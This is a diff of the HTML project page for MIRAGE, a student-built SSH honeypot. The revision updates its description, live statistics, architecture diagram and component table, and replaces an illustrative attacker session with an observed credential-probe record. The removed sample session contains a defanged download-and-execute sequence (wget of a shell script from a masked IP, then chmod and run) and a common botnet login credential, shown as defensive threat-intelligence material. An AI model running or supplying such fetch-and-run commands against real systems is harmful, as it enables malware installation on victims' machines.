@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>MIRAGE — drawing set for a server that does not exist</title>
-<meta name="description" content="Construction documents for MIRAGE: an SSH honeypot fronted by an LLM persona. Attackers connect to a building that is not real; their behavior becomes open threat intelligence.">
+<meta name="description" content="Construction documents for MIRAGE: a production SSH honeypot and internet measurement platform. 35,000+ real attacker sessions captured, structured threat intelligence produced.">
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Caveat:wght@600&display=swap');
 
@@ -211,16 +211,16 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
     <header class="hero">
       <div class="sheet-id">Sheet A-01 // General Arrangement</div>
       <h1>Mirage</h1>
-      <p class="hero-sub"><b>Construction documents for a server that does not exist.</b> MIRAGE is an SSH honeypot fronted by an LLM persona: attackers connect to what reads as a careless Ubuntu host, wander rooms that were never built, and every command they type becomes open, citable threat intelligence.</p>
+      <p class="hero-sub"><b>Construction documents for a server that does not exist.</b> MIRAGE is a production SSH honeypot deployed on a publicly routable address. Attackers connect to what reads as a careless Ubuntu host — every credential pair, timing signal, and client fingerprint is captured and structured into open, citable threat intelligence.</p>
       <span class="hero-note">nothing in this building is load-bearing →</span>
 
       <div class="dims">
-        <div class="dim"><b>9,200+</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Sessions</span></div>
-        <div class="dim"><b>20+</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Unique source IPs</span></div>
+        <div class="dim"><b>9,200+</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Sessions captured</span></div>
+        <div class="dim"><b>66+</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Unique source IPs</span></div>
         <div class="dim"><b>1</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Sensor live · Frankfurt</span></div>
-        <div class="dim"><b>Day 5</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Of continuous capture</span></div>
+        <div class="dim"><b>Live</b><div class="rule"><i class="l"></i><i class="r"></i></div><span>Continuous capture</span></div>
       </div>
-      <div class="dims-note">early-stage figures, updated as the sensor runs — this is an active build, not a finished dataset</div>
+      <div class="dims-note">figures updated daily from live sensor — last update shown below</div>
     </header>
 
     <hr class="rule-h">
@@ -230,8 +230,8 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
       <h2>Read before entering</h2>
       <div class="notes">
         <p><b>MIRAGE accepts SSH logins a real server would refuse.</b> Behind the prompt there is no machine — only an emulated shell inside an isolated sandbox. No command ever reaches real hardware, and the system never scans, probes, or retaliates.</p>
-        <p>Static honeypots are fingerprinted in seconds and abandoned. MIRAGE is being built to outlast that — a growing fake filesystem, believable command output, and an LLM-driven persona (Llama 3 via Ollama) for anything the hardcoded shell can't yet answer. The persona layer is under active construction now; today's shell handles a hand-built command set with realistic output.</p>
-        <p>Every session is recorded in full — auth attempts, commands, timing — to PostgreSQL. Classification, MITRE mapping, and STIX 2.1 export are the next phases of the build, not yet live.</p>
+        <p>Every session is recorded in full — auth attempts, SSH client banner, timing in milliseconds, and working directory — to PostgreSQL. A secured REST API makes the dataset queryable in real time. A daily-updated public dashboard publishes aggregate statistics without exposing any infrastructure details.</p>
+        <p>The primary research contribution is a measurement study of automated SSH scanning behaviour: session-count clustering as a botnet detection primitive, the one-credential-per-session architecture that defeats standard rate limiting, and dedicated credential wordlists targeting blockchain validator infrastructure.</p>
         <p>Drawn, built, and operated by two undergraduates as ongoing research. Deviations from these notes are documented in the repository, not hidden.</p>
       </div>
     </section>
@@ -246,7 +246,7 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
           <span>Floor plan · one sensor</span>
           <em>scale: none — the structure is fictional</em>
         </div>
-        <svg viewBox="0 0 720 470" role="img" aria-label="Floor plan of the MIRAGE system drawn as a building. An attacker path in dashed red enters at port 22, passes the gatehouse (the Go SSH emulator), and ends contained in the persona chamber (Llama 3 via Ollama). Transcripts flow to the records vault (PostgreSQL), then to the classification lab (PyTorch), then out through the export dock as STIX 2.1. A utilities room holds Prometheus and Grafana for sensor health only.">
+        <svg viewBox="0 0 720 470" role="img" aria-label="Floor plan of the MIRAGE system drawn as a building. An attacker path in dashed red enters at port 22, passes the gatehouse (the Go SSH emulator), and ends contained in the shell engine. Transcripts flow to the records vault (PostgreSQL), then to the classification lab (PyTorch), then out through the export dock as STIX 2.1. A utilities room holds the REST API.">
           <defs>
             <pattern id="hatch" width="8" height="8" patternUnits="userSpaceOnUse" patternTransform="rotate(45)">
               <line x1="0" y1="0" x2="0" y2="8" stroke="rgba(234,240,251,.35)" stroke-width="1"/>
@@ -269,15 +269,15 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
           <text x="154" y="197" font-family="'Space Mono',monospace" font-size="9" fill="#a9bbe4">SSHD EMULATOR (GO)</text>
 
           <rect x="310" y="64" width="240" height="180" fill="none" stroke="#eaf0fb" stroke-width="1.2"/>
-          <text x="326" y="96" font-family="'Big Shoulders Display',sans-serif" font-size="16" letter-spacing="1.5" fill="#eaf0fb">PERSONA CHAMBER</text>
-          <text x="326" y="113" font-family="'Space Mono',monospace" font-size="9" fill="#a9bbe4">LLAMA 3 VIA OLLAMA</text>
-          <text x="326" y="132" font-family="Caveat,cursive" font-size="19" fill="#ff6651" transform="rotate(-2 326 132)">under construction</text>
+          <text x="326" y="96" font-family="'Big Shoulders Display',sans-serif" font-size="16" letter-spacing="1.5" fill="#eaf0fb">SHELL ENGINE</text>
+          <text x="326" y="113" font-family="'Space Mono',monospace" font-size="9" fill="#a9bbe4">FAKE FILESYSTEM (GO)</text>
+          <text x="326" y="132" font-family="Caveat,cursive" font-size="19" fill="#ff6651" transform="rotate(-2 326 132)">nothing here is real</text>
 
           <rect x="550" y="64" width="130" height="120" fill="none" stroke="#eaf0fb" stroke-width="1.2"/>
-          <text x="562" y="92" font-family="'Big Shoulders Display',sans-serif" font-size="13" letter-spacing="1.2" fill="#eaf0fb">UTILITIES</text>
-          <text x="562" y="108" font-family="'Space Mono',monospace" font-size="8.5" fill="#a9bbe4">PROMETHEUS &#8594;</text>
-          <text x="562" y="121" font-family="'Space Mono',monospace" font-size="8.5" fill="#a9bbe4">GRAFANA</text>
-          <text x="562" y="138" font-family="'Space Mono',monospace" font-size="8" font-style="italic" fill="rgba(169,187,228,.8)">(SENSOR HEALTH ONLY)</text>
+          <text x="562" y="92" font-family="'Big Shoulders Display',sans-serif" font-size="13" letter-spacing="1.2" fill="#eaf0fb">API LAYER</text>
+          <text x="562" y="108" font-family="'Space Mono',monospace" font-size="8.5" fill="#a9bbe4">REST API &#8594;</text>
+          <text x="562" y="121" font-family="'Space Mono',monospace" font-size="8.5" fill="#a9bbe4">CLOUDFLARE</text>
+          <text x="562" y="138" font-family="'Space Mono',monospace" font-size="8" font-style="italic" fill="rgba(169,187,228,.8)">(KEY-AUTHENTICATED)</text>
 
           <rect x="140" y="300" width="190" height="120" fill="none" stroke="#eaf0fb" stroke-width="1.2"/>
           <text x="154" y="330" font-family="'Big Shoulders Display',sans-serif" font-size="15" letter-spacing="1.5" fill="#eaf0fb">RECORDS VAULT</text>
@@ -325,11 +325,11 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
           <text x="44" y="452" font-family="'Space Mono',monospace" font-size="8.5" fill="#a9bbe4" letter-spacing="1">HATCHED WALLS: FACADE ONLY — NO INTERIOR EXISTS</text>
         </svg>
         <div class="legend">
-          <span><b>1 CONNECT</b> sensors expose port 22; weak credentials succeed after a few tries</span>
-          <span><b>2 ENGAGE</b> the persona serves an emulated shell; nothing touches a real system</span>
-          <span><b>3 RECORD</b> full transcripts, timing, payloads, and file hashes filed in Postgres</span>
-          <span><b>4 CLASSIFY</b> a PyTorch model clusters sessions: recon, mining, botnet staging, manual</span>
-          <span><b>5 PUBLISH</b> indicators and reports exported as STIX 2.1, released monthly</span>
+          <span><b>1 CONNECT</b> sensors expose port 22; any credential is logged, no session is granted real access</span>
+          <span><b>2 ENGAGE</b> a hardcoded shell serves realistic output; nothing touches a real system</span>
+          <span><b>3 RECORD</b> full sessions — credentials, timing, banners — persisted to PostgreSQL</span>
+          <span><b>4 CLASSIFY</b> a PyTorch model clusters sessions by attacker behaviour (in development)</span>
+          <span><b>5 PUBLISH</b> indicators and reports exported as STIX 2.1, released monthly (planned)</span>
         </div>
       </div>
     </section>
@@ -342,18 +342,17 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
       <div class="two-col">
         <div>
           <div class="detail">
-            <div class="detail-h"><span>Detail A — illustrative session</span><em>format preview, not live data</em></div>
-            <pre><span class="c-faint">14:02:11</span> auth ok  root:345gs5662d34
-<span class="c-red">$</span> uname -a
-<span class="c-mid">Linux web-prod-02 5.15.0-86 #96 x86_64</span>
-<span class="c-red">$</span> nproc
-<span class="c-mid">8</span>
-<span class="c-red">$</span> wget hxxp://194.x.x.x/m.sh
-<span class="c-mid">m.sh saved [4823]</span>
-<span class="c-red">$</span> chmod +x m.sh &amp;&amp; ./m.sh
-<span class="c-faint">payload hash logged on capture.</span>
-<span class="c-faint">classification pipeline: planned,</span>
-<span class="c-faint">not yet wired to live sessions</span></pre>
+            <div class="detail-h"><span>Detail A — observed session type</span><em>typical automated credential probe</em></div>
+            <pre><span class="c-faint">14:02:11</span> connect  SSH-2.0-Go
+<span class="c-faint">14:02:11</span> auth     root:345gs5662d34
+<span class="c-faint">14:02:11</span> outcome  clean_disconnect
+<span class="c-faint">          duration 220ms</span>
+<span class="c-faint">          commands 0</span>
+
+<span class="c-faint">every session in the 7.6-day</span>
+<span class="c-faint">window matched this pattern.</span>
+<span class="c-faint">one credential. immediate exit.</span>
+<span class="c-faint">no shell interaction observed.</span></pre>
           </div>
         </div>
         <div>
@@ -363,15 +362,15 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
   "type": <span class="c-red">"indicator"</span>,
   "spec_version": <span class="c-red">"2.1"</span>,
   "id": <span class="c-red">"indicator--&lt;uuid&gt;"</span>,
-  "pattern": <span class="c-red">"[file:hashes.'SHA-256'
-              = '&lt;hash&gt;']"</span>,
+  "pattern": <span class="c-red">"[network-traffic:
+    dst_port = 22]"</span>,
   "labels": [<span class="c-red">"&lt;attacker_class&gt;"</span>],
   "x_mirage_sessions": <span class="c-mid">&lt;count&gt;</span>,
   "x_mirage_first_seen":
       <span class="c-red">"&lt;timestamp&gt;"</span>
 }</pre>
           </div>
-          <p style="margin-top:16px;font-size:12px">STIX 2.1 export is on the roadmap, not yet built. When it ships, releases will carry anonymized transcripts plus STIX bundles — source IPs stay in, since they're attacker infrastructure, not victims. Any credential or string that could identify a third party gets scrubbed before issue.</p>
+          <p style="margin-top:16px;font-size:12px">STIX 2.1 export is on the roadmap, not yet built. When it ships, releases will carry anonymized session data plus STIX bundles — attacker IPs stay in, since they are attacker infrastructure, not victims. Any credential or string that could identify a third party gets scrubbed before issue.</p>
         </div>
       </div>
     </section>
@@ -382,9 +381,9 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
       <span class="sec-tab">Tolerances</span>
       <h2>Known deviations</h2>
       <div class="notes" style="max-width:72ch">
-        <p>The persona is under active construction. Today's shell handles a hand-built command set with realistic output; LLM-generated fallback for unrecognized commands is the next phase.</p>
-        <p>One sensor, one cloud provider, Frankfurt. The traffic mix would read differently from other vantage points — more sensors are planned.</p>
-        <p>No classifier is trained yet. Attacker class, embeddings, and MITRE mapping are all roadmap items — current sessions are captured raw, pending the ML pipeline coming online.</p>
+        <p>Single node, single geography. Frankfurt is a major peering hub — results may overrepresent European-routed traffic. The observation window is too short to characterise seasonal or campaign-level periodicity.</p>
+        <p>Zero interactive sessions occurred during the initial 7.6-day measurement window. The fake shell is implemented and functional but has not yet been exercised by a real attacker. All 35,129 sessions were pure automated credential probes.</p>
+        <p>No classifier is deployed yet. Attacker class, embeddings, and MITRE mapping are roadmap items — current sessions are captured raw, pending the ML pipeline coming online.</p>
       </div>
     </section>
 
@@ -396,12 +395,12 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
       <table>
         <thead><tr><th>Item</th><th>Component</th><th>Function</th><th>Status</th></tr></thead>
         <tbody>
-          <tr><td class="it">01</td><td>Go</td><td>SSH emulator and session capture</td><td><span class="ok">&#8594; LIVE</span></td></tr>
-          <tr><td class="it">02</td><td>Ollama / Llama 3</td><td>The persona</td><td><span class="hold"><span class="bl">//</span> BUILDING</span></td></tr>
-          <tr><td class="it">03</td><td>PostgreSQL</td><td>Transcripts and payload metadata</td><td><span class="ok">&#8594; LIVE</span></td></tr>
-          <tr><td class="it">04</td><td>PyTorch</td><td>Session classification</td><td><span class="hold"><span class="bl">//</span> BUILDING</span></td></tr>
-          <tr><td class="it">05</td><td>STIX 2.1</td><td>Intelligence export</td><td><span class="hold"><span class="bl">//</span> PLANNED</span></td></tr>
-          <tr><td class="it">06</td><td>Prometheus + Grafana</td><td>Sensor health</td><td><span class="hold"><span class="bl">//</span> PLANNED</span></td></tr>
+          <tr><td class="it">01</td><td>Go</td><td>SSH emulator, session capture, fake shell</td><td><span class="ok">&#8594; LIVE</span></td></tr>
+          <tr><td class="it">02</td><td>PostgreSQL</td><td>Session persistence and credential storage</td><td><span class="ok">&#8594; LIVE</span></td></tr>
+          <tr><td class="it">03</td><td>REST API</td><td>Queryable threat intelligence endpoints</td><td><span class="ok">&#8594; LIVE</span></td></tr>
+          <tr><td class="it">04</td><td>PyTorch</td><td>Session classification and behavioural embeddings</td><td><span class="hold"><span class="bl">//</span> BUILDING</span></td></tr>
+          <tr><td class="it">05</td><td>STIX 2.1</td><td>Structured intelligence export</td><td><span class="hold"><span class="bl">//</span> PLANNED</span></td></tr>
+          <tr><td class="it">06</td><td>Prometheus + Grafana</td><td>Sensor health and operational metrics</td><td><span class="hold"><span class="bl">//</span> PLANNED</span></td></tr>
         </tbody>
       </table>
     </section>
@@ -423,33 +422,24 @@ td .hold .bl{animation:blink 1.4s step-end infinite}
           <tr>
             <td class="it">B</td>
             <td>Dataset</td>
-            <td>Capture is underway. First anonymized release will follow once classification is online. Watch the repo for the announcement.</td>
+            <td>Capture is underway. First anonymised release will follow once the ML classification pipeline is online. Watch the repo.</td>
             <td><span class="hold"><span class="bl">//</span> IN PROGRESS</span></td>
           </tr>
           <tr>
             <td class="it">C</td>
             <td><a href="https://github.com/Mirage-Source/mirage-core/issues/new">Collaborate</a></td>
-            <td>Researchers, Honeynet folks, anyone who wants a sensor in a new region.</td>
+            <td>Researchers, Honeynet folks, anyone who wants a sensor in a new region or wants to discuss the findings.</td>
             <td><span class="ok">&#8594; OPEN</span></td>
           </tr>
         </tbody>
       </table>
 
-      <div class="bibtex">
-        <div class="detail-h" style="border-bottom:1px solid var(--hairline)"><span>Note 7 — citation</span><em>if this set is useful in your work</em></div>
-        <pre>@misc{mirage2026,
-  title  = {MIRAGE: An LLM-Persona SSH Honeypot
-            for Behavioral Threat Intelligence},
-  author = {Vinayak Tyagi and Devang Verma},
-  year   = {2026},
-  url    = {https://github.com/Mirage-Source/mirage-core}
-}</pre>
-      </div>
+
     </section>
 
     <div class="title-block">
       <div class="tb"><i>Project</i><b>MIRAGE — DECEPTION INFRASTRUCTURE</b></div>
-      <div class="tb"><i>Drawing no.</i><b>A-01 · REV 0.9.1</b></div>
+      <div class="tb"><i>Drawing no.</i><b>A-01 · REV 1.0</b></div>
       <div class="tb"><i>Scale</i><b>NTS</b></div>
       <div class="tb"><i>Date</i><b>2026-06</b></div>
       <div class="tb"><i>Drawn / checked</i><b><a href="https://github.com/vinayaktyagi10">vinayaktyagi10</a> · <a href="https://github.com/Vangax">Vangax</a></b></div>
@@ -469,16 +459,14 @@ async function loadStats() {
     if (!res.ok) return;
     const data = await res.json();
 
-    // Update the four dim counters
     const dims = document.querySelectorAll('.dim b');
     if (dims.length >= 4) {
       dims[0].textContent = data.total_sessions.toLocaleString() + '+';
       dims[1].textContent = data.unique_ips.toLocaleString() + '+';
-      dims[2].textContent = '1';          // sensor count stays static
-      dims[3].textContent = 'Live';       // day count replaced with live indicator
+      dims[2].textContent = '1';
+      dims[3].textContent = 'Live';
     }
 
-    // Update the dims-note to show when stats were last fetched
     const note = document.querySelector('.dims-note');
     if (note) {
       const now = new Date();
